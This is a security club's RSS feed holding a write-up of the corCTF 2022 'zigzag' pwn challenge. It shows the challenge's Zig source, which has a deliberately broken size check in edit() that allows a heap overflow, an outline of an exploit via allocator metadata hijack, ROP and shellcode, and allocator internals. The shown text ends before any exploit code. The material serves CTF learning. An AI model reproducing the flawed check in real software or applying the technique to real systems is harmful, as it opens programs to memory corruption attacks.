<?xml-stylesheet href="/rss.xsl" type="text/xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>ESIEA security club</title>
    <link>https://clubsecu-esiea.github.io/</link>
    <description>Recent content on ESIEA security club</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Beerware shit</copyright>
    <lastBuildDate>Mon, 08 Aug 2022 00:00:00 +0000</lastBuildDate>
    
        <atom:link href="https://clubsecu-esiea.github.io/index.xml" rel="self" type="application/rss+xml" />
    
    
    
        <item>
        <title>[corCTF 2022 - pwn] zigzag</title>
        <link>https://clubsecu-esiea.github.io/posts/zigzag/</link>
        <pubDate>Mon, 08 Aug 2022 00:00:00 +0000</pubDate>
        
        <guid>https://clubsecu-esiea.github.io/posts/zigzag/</guid>
        <description>ESIEA security club https://clubsecu-esiea.github.io/posts/zigzag/ -&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;zigzag&lt;/code&gt; is a zig heap challenge I did during the &lt;a href=&#34;https://ctftime.org/event/1656&#34;&gt;corCTF 2022&lt;/a&gt; event. It was pretty exotic given we have to pwn a heap like challenge written in &lt;a href=&#34;https://ziglang.org/&#34;&gt;zig&lt;/a&gt;. It is not using the C allocator but instead it uses the GeneralPurposeAllocator, which makes the challenge even more interesting. Find the tasks &lt;a href=&#34;https://github.com/ret2school/ctf/tree/master/2022/corCTF/pwn/zieg&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;tl-dr&#34;&gt;TL; DR&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Understanding zig &lt;code&gt;GeneralPurposeAllocator&lt;/code&gt; internals&lt;/li&gt;
&lt;li&gt;Hiijack the &lt;code&gt;BucketHeader&lt;/code&gt; of a given bucket to get a write what were / read what where primitive.&lt;/li&gt;
&lt;li&gt;Leak stack + ROP on the fileRead function (mprotect + shellcode)&lt;/li&gt;
&lt;li&gt;PROFIT&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;source-code-analysis&#34;&gt;Source code analysis&lt;/h2&gt;
&lt;p&gt;The source code is procided:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// zig build-exe main.zig -O ReleaseSmall
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// built with zig version: 0.10.0-dev.2959+6f55b294f
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; std &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;import(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;std&amp;#34;&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; fmt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std.fmt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; stdout &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std.io.getStdOut().writer();
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; stdin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std.io.getStdIn();

&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; MAX_SIZE: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x500&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; ERR: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xbaad0000&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; NULL: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xdead0000&lt;/span&gt;;

var chunklist: [&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;][]&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; undefined;

var gpa &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std.heap.GeneralPurposeAllocator(.{}){};
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; allocator &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gpa.allocator();

&lt;span style=&#34;color:#66d9ef&#34;&gt;pub&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;void {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[1] Add\n&amp;#34;&lt;/span&gt;, .{});
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[2] Delete\n&amp;#34;&lt;/span&gt;, .{});
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[3] Show\n&amp;#34;&lt;/span&gt;, .{});
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[4] Edit\n&amp;#34;&lt;/span&gt;, .{});
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[5] Exit\n&amp;#34;&lt;/span&gt;, .{});
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, .{});
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;pub&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;readNum&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; {
    var buf: [&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; undefined;
    var stripped: []&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; undefined;
    var amnt: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; undefined;
    var num: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; undefined;

    amnt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdin.read(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buf);
    stripped &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std.mem.trimRight(&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt;, buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;..&lt;/span&gt;amnt], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\n&amp;#34;&lt;/span&gt;);

    num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fmt.parseUnsigned(&lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;, stripped, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;) catch {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ERR;
    };

    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; num;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;pub&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;void {
    var idx: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; undefined;
    var size: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; undefined;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Index: &amp;#34;&lt;/span&gt;, .{});
    idx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; readNum();

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (idx &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ERR or idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; chunklist.len or &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;ptrToInt(chunklist[idx].ptr) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid index!\n&amp;#34;&lt;/span&gt;, .{});
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
    }

    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Size: &amp;#34;&lt;/span&gt;, .{});
    size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; readNum();

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ERR or size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; MAX_SIZE) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid size!\n&amp;#34;&lt;/span&gt;, .{});
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
    }

    chunklist[idx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; allocator.alloc(&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt;, size);

    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Data: &amp;#34;&lt;/span&gt;, .{});
    _ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdin.read(chunklist[idx]);
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;pub&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;void {
    var idx: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; undefined;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Index: &amp;#34;&lt;/span&gt;, .{});
    idx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; readNum();

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (idx &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ERR or idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; chunklist.len or &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;ptrToInt(chunklist[idx].ptr) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid index!\n&amp;#34;&lt;/span&gt;, .{});
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
    }

    _ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; allocator.free(chunklist[idx]);

    chunklist[idx].ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;intToPtr([&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt;, NULL);
    chunklist[idx].len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;pub&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;void {
    var idx: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; undefined;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Index: &amp;#34;&lt;/span&gt;, .{});
    idx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; readNum();

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (idx &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ERR or idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; chunklist.len or &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;ptrToInt(chunklist[idx].ptr) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid index!\n&amp;#34;&lt;/span&gt;, .{});
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
    }

    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{s}\n&amp;#34;&lt;/span&gt;, .{chunklist[idx]});
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;pub&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;edit&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;void {
    var idx: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; undefined;
    var size: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; undefined;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Index: &amp;#34;&lt;/span&gt;, .{});
    idx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; readNum();

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (idx &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ERR or idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; chunklist.len or &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;ptrToInt(chunklist[idx].ptr) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid index!\n&amp;#34;&lt;/span&gt;, .{});
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
    }

    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Size: &amp;#34;&lt;/span&gt;, .{});
    size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; readNum();

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; chunklist[idx].len and size &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ERR) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid size!\n&amp;#34;&lt;/span&gt;, .{});
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
    }

    chunklist[idx].len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdout.print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Data: &amp;#34;&lt;/span&gt;, .{});
    _ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; stdin.read(chunklist[idx]);
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;pub&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;void {
    var choice: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; undefined;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (chunklist) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;_, i&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; {
        chunklist[i].ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;intToPtr([&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt;, NULL);
        chunklist[i].len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    }

    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; menu();

        choice &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; readNum();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (choice &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ERR) &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;;

        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (choice &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; add();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (choice &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; delete();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (choice &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; show();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (choice &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; edit();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (choice &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The source code is quite readable, the vulnerability is the overflow within the &lt;code&gt;edit&lt;/code&gt; function. The check onto the provided size isn&amp;rsquo;t efficient, &lt;code&gt;size &amp;gt; chunklist[idx].len and size == ERR&lt;/code&gt;, if &lt;code&gt;size &amp;gt; chunklist[idx].len&lt;/code&gt; and if &lt;code&gt;size != ERR&lt;/code&gt; the condition is false. Which means we can edit the chunk by writing an arbitrary amount of data in it.&lt;/p&gt;
&lt;h2 id=&#34;generalpurposeallocator-abstract&#34;&gt;GeneralPurposeAllocator abstract&lt;/h2&gt;
&lt;p&gt;The &lt;a href=&#34;https://github.com/ziglang/zig/&#34;&gt;zig&lt;/a&gt; source is quite readable so let&amp;rsquo;s take a look at the internals of the GeneralPurposeAllocator allocator.
The GeneralPurposeAllocator is implemented &lt;a href=&#34;https://github.com/ziglang/zig/blob/master/lib/std/heap/general_purpose_allocator.zig&#34;&gt;here&lt;/a&gt;.
The header of the source code file gives the basic design of the allocator:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//! ## Basic Design:
//!
//! Small allocations are divided into buckets:
//!
//! ```
//! index obj_size
//! 0     1
//! 1     2
//! 2     4
//! 3     8
//! 4     16
//! 5     32
//! 6     64
//! 7     128
//! 8     256
//! 9     512
//! 10    1024
//! 11    2048
//! ```
//!
//! The main allocator state has an array of all the &amp;quot;current&amp;quot; buckets for each
//! size class. Each slot in the array can be null, meaning the bucket for that
//! size class is not allocated. When the first object is allocated for a given
//! size class, it allocates 1 page of memory from the OS. This page is
//! divided into &amp;quot;slots&amp;quot; - one per allocated object. Along with the page of memory
//! for object slots, as many pages as necessary are allocated to store the
//! BucketHeader, followed by &amp;quot;used bits&amp;quot;, and two stack traces for each slot
//! (allocation trace and free trace).
//!
//! The &amp;quot;used bits&amp;quot; are 1 bit per slot representing whether the slot is used.
//! Allocations use the data to iterate to find a free slot. Frees assert that the
//! corresponding bit is 1 and set it to 0.
//!
//! Buckets have prev and next pointers. When there is only one bucket for a given
//! size class, both prev and next point to itself. When all slots of a bucket are
//! used, a new bucket is allocated, and enters the doubly linked list. The main
//! allocator state tracks the &amp;quot;current&amp;quot; bucket for each size class. Leak detection
//! currently only checks the current bucket.
//!
//! Resizing detects if the size class is unchanged or smaller, in which case the same
//! pointer is returned unmodified. If a larger size class is required,
//! `error.OutOfMemory` is returned.
//!
//! Large objects are allocated directly using the backing allocator and their metadata is stored
//! in a `std.HashMap` using the backing allocator.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s take a look at &lt;code&gt;alloc&lt;/code&gt; function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;alloc&lt;/span&gt;(self: &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;Self, len: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;, ptr_align: &lt;span style=&#34;color:#a6e22e&#34;&gt;u29&lt;/span&gt;, len_align: &lt;span style=&#34;color:#a6e22e&#34;&gt;u29&lt;/span&gt;, ret_addr: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;) Error&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;[]&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt; {
    self.mutex.lock();
    defer self.mutex.unlock();

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;self.isAllocationAllowed(len)) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; error.OutOfMemory;
    }

    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; new_aligned_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; math.max(len, ptr_align);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (new_aligned_size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; largest_bucket_object_size) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; self.large_allocations.ensureUnusedCapacity(self.backing_allocator, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; slice &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; self.backing_allocator.rawAlloc(len, ptr_align, len_align, ret_addr);

        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; gop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self.large_allocations.getOrPutAssumeCapacity(&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;ptrToInt(slice.ptr));
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (config.retain_metadata and &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;config.never_unmap) {
            &lt;span style=&#34;color:#75715e&#34;&gt;// Backing allocator may be reusing memory that we&amp;#39;re retaining metadata for
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            assert(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;gop.found_existing or gop.value_ptr.freed);
        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
            assert(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;gop.found_existing); &lt;span style=&#34;color:#75715e&#34;&gt;// This would mean the kernel double-mapped pages.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        }
        gop.value_ptr.bytes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; slice;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (config.enable_memory_limit)
            gop.value_ptr.requested_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len;
